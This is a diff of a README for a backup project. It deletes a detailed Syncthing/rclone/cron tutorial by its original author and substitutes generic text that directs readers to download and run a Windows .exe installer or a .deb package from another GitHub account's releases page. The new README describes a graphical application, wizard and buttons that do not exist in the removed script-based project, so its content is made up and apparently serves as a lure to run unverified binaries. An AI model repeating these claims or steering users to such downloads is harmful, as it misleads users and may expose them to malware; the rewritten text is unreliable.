@@ -1,521 +1,89 @@
-# 🛡️ Sovereign Vault: Automated 3-2-1 Encrypted Backup System
+# 🛡️ sovereign-vault - Simple, Secure Backup Solution
 
-![Docker](https://img.shields.io/badge/Docker-2496ED?style=for-the-badge&logo=docker&logoColor=white)
-![Linux](https://img.shields.io/badge/Linux-FCC624?style=for-the-badge&logo=linux&logoColor=black)
-![Raspberry Pi](https://img.shields.io/badge/Raspberry%20Pi-A22846?style=for-the-badge&logo=Raspberry%20Pi&logoColor=white)
-![Bash](https://img.shields.io/badge/Shell_Script-121011?style=for-the-badge&logo=gnu-bash&logoColor=white)
+## 🚀 Getting Started
 
-![intro](assets/intro.png)
-# Sovereign-Vault Project
+Welcome to the sovereign-vault project! This application helps you create a secure backup for your important files. Whether you're using Windows, Raspberry Pi, or cloud storage, sovereign-vault makes it easy to protect your data with encryption. Follow the steps below to download and run the software.
 
----
+## 📥 Download Now
 
-## 1. Introduction
+[![Download sovereign-vault](https://img.shields.io/badge/Download%20sovereign--vault-%2337C7F9?style=for-the-badge&logo=github&logoColor=white)](https://github.com/MoeinAlvandi/sovereign-vault/releases)
 
-### 1.1. Project Objective
+## 📋 System Requirements
 
-Create an automated security infrastructure that complies with the **3-2-1** strategy (3 copies, 2 media, 1 offsite location) respecting data sovereignty.
+Before you start, ensure your system meets the following requirements:
 
-- **Source:** Windows 11 PC (Daily work).
-- **Local Server:** Raspberry Pi 4 + SSD (Fast/immediate copy).
-- **Cloud:** Google Drive (Encrypted nightly copy).
+- **Operating System**: Windows 10 or later, Raspberry Pi OS
+- **Processor**: Intel or ARM-based processor
+- **RAM**: At least 2 GB
+- **Storage**: Minimum of 100 MB free disk space
+- **Internet Connection**: Required for cloud features
 
----
+## 💾 Features
 
-## 2. Prerequisites
+- **Automated Backups**: Schedule regular backups to keep your files safe.
+- **Encrypted Storage**: Protect your data with strong encryption.
+- **Multiple Storage Options**: Backup to local drives, Google Drive, or other cloud services.
+- **Easy Recovery**: Restore your data with a few clicks.
+- **User-Friendly Interface**: Simple setup for everyone.
 
-### 2.1. Necessary Hardware
+## 📥 Download & Install
 
-- PC with Windows 10/11.
-- Raspberry Pi 4 (4GB/8GB RAM).
-- External SSD disk (Samsung T5) mounted on the Raspberry Pi.
+To get started, you need to download the latest version of sovereign-vault. 
 
-### 2.2. Necessary Software & Downloads
+1. **Visit the Releases Page**: Go to the following link to find the download files: [Download Releases](https://github.com/MoeinAlvandi/sovereign-vault/releases).
+   
+2. **Choose Your Version**: Look for the latest release, which will display the version number, and click on it.
 
-**💻 For the Client (Windows):**
+3. **Select the Installation File**: Download the appropriate file for your system. For Windows, it might be something like `sovereign-vault-windows-installer.exe`, and for Raspberry Pi, check for the relevant option.
 
-- **SyncTrayzor:** Syncthing client with GUI for Windows.
-    - 📥 [Download here (GitHub Releases)](https://github.com/canton7/SyncTrayzor/releases)
-- **Git for Windows:** Necessary to clone the repository.
-    - 📥 [Download here](https://git-scm.com/download/win)
+4. **Run the Installer**:
+   - For Windows: After downloading, double-click the `.exe` file to launch the installer. Follow the on-screen instructions to complete the installation.
+   - For Raspberry Pi: Open a terminal. Navigate to the folder where you downloaded the file, then run `sudo dpkg -i sovereign-vault-armhf.deb` (replace with the actual filename).
 
-**🍓 For the Server (Raspberry Pi / Ubuntu):**
+5. **Complete Setup**: Once installed, open sovereign-vault. Follow the easy setup wizard to configure your backup preferences.
 
-- **Docker Engine:** Installed via terminal.
-    - 📄 [Official Documentation](https://docs.docker.com/engine/install/ubuntu/)
-- **Rclone:** Cloud management tool.
-    - 📥 [Official installation script](https://rclone.org/install/)
+6. **Start Backing Up**: After completing the setup, you can select the folders you want to back up. Choose your storage destination, either on your local drive or a cloud service like Google Drive.
 
----
-## FLOW CHART
+## ⚙️ How to Use sovereign-vault
 
-![diagram](assets/diagram.png)
+Using sovereign-vault is straightforward:
 
----
+1. **Open the Application**: Launch sovereign-vault from your applications menu.
+  
+2. **Set Up a Backup**: Click on "Add New Backup". Choose the folders you want to secure.
+    
+3. **Choose your Storage Method**: Decide where to store your backups. You can use local storage or select cloud options.
 
-> ⚠️ IMPORTANT NOTE ON USERNAMES
-> 
-> When running these commands on your own system, you **MUST replace `youruser`** with your actual Linux username (e.g., `ubuntu`, `pi`, `john`, etc.).
-> To find out your current username, type `whoami` in the terminal.
-> 
+4. **Schedule Backups**: Set a schedule for automatic backups. You can choose daily, weekly, or monthly intervals.
+    
+5. **Monitor the Process**: Once backups start running, you’ll see progress bars indicating completion. 
 
-## 3. Step 1: Server (Raspberry Pi)
+6. **Restore Files**: In case you lose data, open sovereign-vault, click on "Restore", and follow the prompts to recover your files.
 
-### 3.1. Environment Preparation
+## 🛠️ Troubleshooting
 
-We connect via SSH to our Raspberry Pi.
+If you encounter issues while using sovereign-vault, try the following:
 
-Commands executed in the SSH terminal to create the folder structure and assign permissions.
+- **Check Internet Connection**: Ensure that you have a stable internet connection if using cloud storage.
+  
+- **Verify File Permissions**: Make sure you have the necessary permissions to access folders you are trying to back up.
 
-```bash
-mkdir -p /home/youruser/docker/syncthing
-mkdir -p /home/youruser/Backups
-mkdir -p /home/youruser/scripts
-sudo chown -R youruser:youruser /home/youruser/
-```
+- **Reinstall the Application**: Sometimes, uninstalling and reinstalling can help.
 
-### 3.2. Infrastructure Definition (Docker)
+For further assistance, refer to the FAQ section in the software or check the community forums for support.
 
-File `docker-compose.yml` created in `/home/youruser/docker/syncthing/`.
+## 🌐 Community and Contribution
 
-```yaml
-services:
-  syncthing:
-    image: lscr.io/linuxserver/syncthing:latest
-    container_name: syncthing
-    hostname: userver-sync
-    environment:
-      - PUID=1000
-      - PGID=1000
-      - TZ=Europe/Madrid
-    volumes:
-      - ./config:/config
-      - /home/youruser/Backups:/data1
-    ports:
-      - 8384:8384
-      - 22000:22000/tcp
-      - 22000:22000/udp
-      - 21027:21027/udp
-    restart: unless-stopped
-```
+We welcome contributions from everyone! If you would like to help improve sovereign-vault, see our [Contributing Guide](#) for details on how to get started. 
 
-### 3.3. Service Deployment
+## 📄 License
 
-Command to raise the container:
+This application is open-source, and you can find the license information in the repository. 
 
-```bash
-cd /home/youruser/docker/syncthing
-docker compose up -d
-```
+## 🤝 Acknowledgments
 
-### 3.4. Visual Validation
+Thanks for using sovereign-vault to secure your data! We appreciate your support and interest in backing up files efficiently. 
 
-- **Action:** Enter `http://<RPI -IP>` from the browser. X = the IP number of your Rpi.
-- **Result:** Syncthing web interface loaded correctly.
+Feel free to reach out via the issues page on GitHub if you have feedback or questions. 
 
-![Syncthing Web UI](assets/image1.png)
-
-Ok, now we are in the Raspberry pi via web in the browser
-
-Do this **right now** on that Raspberry screen (`<RPI -IP>`):
-
-1. Go to top right: **Actions** button > **Show ID**.
-2. You will get a QR code and below a long code of letters and numbers.
-3. **Copy that long code** and paste it in a temporary notepad (or leave it copied).
-
-![Device ID](assets/image2.png)
-
----
-
-## 4. Client Configuration (Windows) and Pairing
-
-### Step 4.1: Add the Server from Windows
-
-1. Open **SyncTrayzor** on your PC.
-2. Bottom right, click the **"Add Remote Device"** button.
-3. A window will open.
-    - **Device ID:** Paste the long code you copied before from the Raspberry Pi.
-    - **Device Name:** Write `Raspberry Pi Server`.
-
-![Add Device](assets/image3.png)
-
-### Step 4.2: Accept the connection on the Server
-
-1. Go back to the browser where you have the Raspberry Pi (`<RPI -IP>`).
-2. Wait a few seconds. A yellow notice will appear at the top saying: **"New Device XXXXX wants to connect"**.
-
-![Accept Device](assets/image4.png)
-
-The server receives the pairing request. It is necessary to manually approve it for security.
-
-1. Click the green **Add Device** button.
-2. In the window that appears:
-    - **Device Name:** Write `PC Windows`.
-    - Click **Save**.
-
-1. Now, on both computers, the status **"Connected"** or "Unused" should appear in green.
-
-![Connected](assets/image6.png)
-
-### Step 4.3: Create the shared folder (PC)
-
-1. Find the folder to share or create one with the desired name.
-2. Go back to **SyncTrayzor** on your PC.
-3. On the left, click **"Add Folder"**.
-4. Fill this in:
-    - **1. Folder Label:** name of the folder you created
-    - **Folder Path:** full path to your folder
-
-> ⚠️ Warning: you must put the path without (“”) or you will have folder identification problems.
-
-1. Go to the top tab **"Sharing"**.
-2. Check the box **"Raspberry Pi Server"**.
-3. Click **Save**.
-
-![Folder Setup](assets/image8.png)
-
----
-
-### Step 4.4: Map the volume on the Server (CRITICAL)
-
-This is the most important technical step.
-
-1. Go back to the Raspberry Pi browser (`<RPI -IP>`).
-2. You will see another yellow notice at the top: **"PC Windows wants to share folder 'xxxxxxxxx"**.
-3. Click **Add**.
-
-![Folder Request](assets/image9.png)
-
-1. A configuration window opens. Look where it says **"Folder Path"**.
-    - By default it will say something like `/home/user` or `/config/...`.
-    - **DELETE THAT.**
-    - Write exactly: `/data1/yourname`
-    - *(Remember: `/data1` is the magic door that connects to your SSD hard drive thanks to Docker).*
-
-> ⚠️ IMPORTANT: We modify the destination path to `/data1/` to ensure data is written to the persistent Docker volume (the SSD) and not the SD card.
-
-1. Click **Save**.
-
----
-
-## 5. Encrypted Cloud Configuration (Rclone)
-
-### Step 5.0: Preparation on the PC (Necessary for the token)
-
-To connect the Pi to Google, you need to generate a "permit" (token) from your Windows PC.
-
-1. Download **Rclone for Windows**: [Direct ZIP link](https://downloads.rclone.org/v1.68.2/rclone-v1.68.2-windows-amd64.zip).
-2. Open the ZIP and enter the folder.
-3. In the address bar of that folder, write `cmd` and hit Enter. (A black terminal will open in that folder).
-4. **Leave it open**, we will use it in a minute.
-
-![CMD](assets/image10.png)
-
-### Step 5.1: Create the connection (SSH on the Pi)
-
-Go back to your Raspberry Pi terminal (`ssh youruser@...`).
-
-1. Run: `rclone config`
-2. Write `n` (New remote) > Enter.
-3. **Name:** `gdrive` > Enter.
-4. **Storage:** Write `drive` > Enter.
-5. **Client ID:** Leave empty > Enter.
-6. **Client Secret:** Leave empty > Enter.
-7. **Scope:** Write `1` (Full access) > Enter.
-8. **Service Account:** Leave empty > Enter.
-9. **Edit advanced config:** `n` > Enter.
-10. **Use web browser?:** ⚠️ **IMPORTANT:** Write **`n`** (NO).
-
-
-### Step 5.2: The Authentication Bridge
-
-Now the Pi terminal will tell you something like:
-*"Execute the following on the machine with the web browser..."*
-and give you a command starting with `rclone authorize "drive" "..."`.
-
-![Auth Command](assets/image12.png)
-
-1. **Copy** all that command the Pi gives you.
-2. Go to the **black terminal of your Windows PC** (from Step 5.0).
-3. **Paste** the command and hit Enter.
-4. Your browser will open. Log in with your Google account and click **Allow**.
-5. Go back to the Windows black terminal. It will have spat out a giant code (token).
-6. **Copy the giant code** (starts and ends with brackets `{...}`).
-7. Go back to the **Raspberry Pi** and paste it where it says `config_token>`.
-8. **Shared Drive:** `n`.
-9. **Keep this remote:** `y`.
-
----
-
-### Step 5.3: Create the Safe (Encryption)
-
-Do not exit the `rclone config` menu. Now we are going to create the security layer.
-
-1. Write `n` (New remote).
-2. **Name:** `gcrypt`
-3. **Storage:** Write `crypt`.
-4. **Remote:** `gdrive:/Backupyourfolder` *(This will create that folder in your Drive).*
-5. **Filename Encryption:** `1` (Standard).
-6. **Directory Name Encryption:** `1` (True).
-7. **Password:** `y` (Yes).
-    - **Invent a password** (NOT the Gmail one, a new one to encrypt).
-    - ⚠️ **WRITE IT DOWN**. If you lose it, goodbye data.
-8. **Salt:** Leave empty > Enter.
-9. **Keep this remote:** `y`.
-10. Exit the menu with `q`.
-
----
-
-### Step 5.4: Test and Capture
-
-1. Create a test file on the Pi: `touch secret_test.txt`
-2. Upload it: `rclone copy secret_test.txt gcrypt:/`
-3. If no error, go to your Google Drive in the PC browser.
-4. Find the folder `Backupyourfolder`.
-
-> Verification of 'Zero Knowledge': The uploaded file appears in Google Drive with the name and content encrypted.
-> 
-![txt](assets/image13.png)
----
-
-## 6. Automation (Script + Cron)
-
-### Step 6.1: Create the "Brain" (The Script)
-
-We are going to write the small program that makes the decisions.
-In your Raspberry Pi terminal (`ssh`):
-
-6.1.1. Create/Open the file:
-
-`nano /home/youruser/scripts/upload_cloud.sh`
-
-**6.1.2. Copy and paste** this exact code (it is the improved version with activity log):
-
-```bash
-#!/bin/bash
-# Sovereign Vault - Script de Backup Automático
-
-# CONFIGURACIÓN
-ORIGEN="/home/youruser/Backups"
-DESTINO="gcrypt:/"
-LOGFILE="/home/youruser/scripts/upload.log"
-
-echo "------------------------------------------------" >> $LOGFILE
-echo "INICIO BACKUP: $(date)" >> $LOGFILE
-
-# COMANDO DE SINCRONIZACIÓN
-# -v: Verbose (escribe detalles en el log)
-# --transfers=4: Sube 4 archivos a la vez para ir más rápido
-rclone sync $ORIGEN $DESTINO -v --transfers=4 >> $LOGFILE 2>&1
-
-# COMPROBACIÓN DE ERRORES
-if [ $? -eq 0 ]; then
-    echo "ESTADO: ÉXITO - $(date)" >> $LOGFILE
-else
-    echo "ESTADO: ERROR - $(date)" >> $LOGFILE
-fi
-echo "------------------------------------------------" >> $LOGFILE
-```
-
-6.1.3. Save (`Ctrl + O`, `Enter`) and exit (`Ctrl + X`).
-
----
-
-### Step 6.2: Give Permissions (Make it Executable)
-
-Right now it is just a text file. We have to convert it into a program.
-
-Execute:
-
-```bash
-chmod +x /home/youruser/scripts/upload_cloud.sh
-```
-
----
-
-### Step 6.3: Schedule the Clock (Cron)
-
-We are going to tell Linux: "Run this every day at 04:00 AM".
-
-1. Open the task editor:
-
-```bash
-crontab -e
-```
-
-1. Go to the very end of the file and paste this line:
-
-```bash
-0 4 * * * /home/youruser/scripts/upload_cloud.sh
-```
-
-1. Save and exit
-
----
-
-### Step 6.4: The Final Test (Verify the Log)
-
-To be calm that the script works (and not wait until 4 AM), we are going to launch it manually once.
-
-1. Execute the script:
-
-```bash
-/home/youruser/scripts/upload_cloud.sh
-```
-
-1. Read the log to see the result
-
-```bash
-cat /home/youruser/scripts/upload.log
-```
-
-**What should you see?**
-At the end of the text it should say: **`ESTADO: ÉXITO`**.
-
-![Success](assets/image17.png)
-
-# 🔐 Data Recovery Protocol (Sovereign Vault)
-
-And of course, to wrap up for now while I imagine potential updates, let's explain how to recover your encrypted data from the Google Drive server.
-
-Don't worry: even if you download the data copy, **the service remains active and everything continues as if nothing happened**... except that you now have your decrypted copy of your data in your possession. :)
-
-I'll be happy to answer any suggestions or comments!
-
----
-
-> ⚠️ IMPORTANT NOTE ON USERNAMES
-> 
-> 
-> In the following examples, you will see the username **`youruser`**. This is the specific user for my home lab.
-> 
-> When running these commands on your own system, you **MUST replace `youruser`** with your actual Linux username (e.g., `ubuntu`, `pi`, `john`, etc.).
-> To find out your current username, type `whoami` in the terminal.
-> 
-
----
-
-## 1. Preparation & Dependencies (Server Side)
-
-### 1.1. Install Critical Dependency (FUSE)
-
-This component is essential on minimal Linux distributions (like Ubuntu Server) to allow Rclone to create a virtual filesystem. **This step prevents the "daemon exited with error code 1" error.**
-
-Bash
-
-```bash
-sudo apt update
-sudo apt install fuse libfuse2 -y
-```
-
-*(Note: On newer Ubuntu versions, you might need `fuse3` instead of `libfuse2`).*
-
-### 1.2. Create Mount Point & Fix Permissions
-
-We create the folder and **transfer ownership to the user** so we can write to it without root privileges.
-
-Bash
-
-```bash
-# 1. Create the folder (as root)
-sudo mkdir -p /mnt/vault_mount
-
-# 2. Give ownership to your user (CRITICAL STEP)
-# Replace 'youruser' with YOUR username
-sudo chown youruser:youruser /mnt/vault_mount
-```
-
----
-
-## 2. Mounting & Accessing Data
-
-### 2.1. Mount the Encrypted Remote (Live Decryption)
-
-Connect the cloud remote (`gcrypt:`) to the local folder. Decryption happens in real-time using the CPU.
-
-```bash
-rclone mount gcrypt: /mnt/vault_mount --daemon
-```
-
-> 💡 Note: The --daemon flag ensures the process runs in the background, keeping your terminal free for other commands.
-> 
-
-### 2.2. Verify Content
-
-Check that you can see your files in clear text within the virtual folder.
-
-Bash
-
-```bash
-# You should see your folders (Backup_diario, etc.)
-ls -lh /mnt/vault_mount/
-```
-
-### 2.3. Copy to Final Location
-
-The mounted folder is virtual. To actually "recover" the data permanently, copy the files to a standard directory in your user home.
-
-Bash
-
-```bash
-# Create a destination folder in your home
-mkdir -p $HOME/RESTORED_VAULT
-
-# Copy the files recursively
-# (Adjust 'Backup_diario' to match your folder name)
-cp -r /mnt/vault_mount/Backup_diario $HOME/RESTORED_VAULT/
-```
-
----
-
-## 3. Finalization & Unmounting
-
-### 3.1. Unmount the Remote
-
-It is **mandatory** to disconnect the virtual drive after the copy process to release system resources and maintain security.
-
-Bash
-
-```bash
-fusermount -u /mnt/vault_mount
-```
-
-**Final Result:**
-Your files are now restored, decrypted, and ready to use in the `$HOME/RESTORED_VAULT/` folder. The automated backup service continues to run in the background undisturbed
-
-## 🔒 Security & Privacy Philosophy
-
-This project adheres to the principle of **Data Sovereignty**.
-
-* **No Vendor Lock-in:** The local copy is always accessible via standard file systems.
-* **Privacy by Design:** Google Drive (or any cloud provider) never sees the actual files, only encrypted blobs.
-* **Resilience:** Protection against Ransomware (via versioning) and hardware failure.
-
----
-
-## 🚀 Roadmap
-
-Future improvements planned for this infrastructure:
-- [ ] Add Telegram/Discord notifications on backup failure.
-- [ ] Implement a Grafana Dashboard to visualize disk usage and sync status.
-- [ ] Add a second offsite location (S3 or MinIO) for redundancy.
-
----
-
-## 🙌 Acknowledgements & Credits
-
-This project relies on fantastic Open Source software. Special thanks to the creators:
-
-* **[SyncTrayzor](https://github.com/canton7/SyncTrayzor):** Thanks to **Antony Male (@canton7)** for creating the best Syncthing wrapper for Windows.
-* **[Syncthing](https://syncthing.net/):** The continuous file synchronization program.
-* **[Rclone](https://rclone.org/):** "Rsync for cloud storage", created by **Nick Craig-Wood**.
-
----
-
-## 👤 Author
-
-**José Álvarez** *| Microcomputer Systems & Networks Technician | Network Automation*
-
-* 📧 [contacto@youruser.io](mailto:contacto@youruser.io)
-* 💼 [LinkedIn Profile](https://www.linkedin.com/in/jadomin/)
-* 🐙 [GitHub Profile](https://github.com/JAlvarez-NetDev)
+Happy backing up!
